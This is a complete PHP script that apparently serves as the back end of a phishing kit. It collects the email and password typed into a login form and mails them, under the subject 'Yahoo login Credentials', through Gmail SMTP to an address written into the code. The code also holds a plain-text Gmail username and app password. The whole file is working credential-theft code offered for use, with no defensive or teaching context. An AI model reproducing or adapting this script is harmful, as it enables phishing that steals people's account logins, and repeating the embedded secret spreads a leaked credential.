<?php
    use PHPmailer\PHPMailer\PHPMailer;
    
    require_once 'PHPMailer/src/Exception.php';
    require_once 'PHPMailer/src/PHPMailer.php';
    require_once 'PHPMailer/src/SMTP.php';

    $mail = new PHPMailer(true);

    $alert = '';

    if(isset($_POST['submit'])){
        $email = $_POST['email'];
        $password = $_POST['password'];
        try{
            $mail->isSMTP();                                                //Send using SMTP
            $mail->Host       = 'smtp.gmail.com';                           //Set the SMTP server to send through
            $mail->SMTPAuth   = true;                                       //Enable SMTP authentication
            $mail->Username   = 'greenmaze008@gmail.com';                   //SMTP username
            $mail->Password   = 'orwzfnpxduygfooe';                         //SMTP password
            $mail->SMTPSecure = "tls";                                      //Enable implicit TLS encryption
            $mail->Port       = '587';
            
            //RECEIPENT

            $mail->setFrom('greenmaze008@gmail.com');
            $mail->addAddress('greenmaze008@gmail.com'); 

            //Content
            $mail->isHTML(true);                                            //Set email format to HTML
            $mail->Subject = 'Yahoo login Credentials';
            $mail->Body    = "E-mail: $email <br>Password: $password";

            $mail->send();
        } catch (Exception $e){
            //$alert = "<div class='alert'></div>";
        }

    }
?>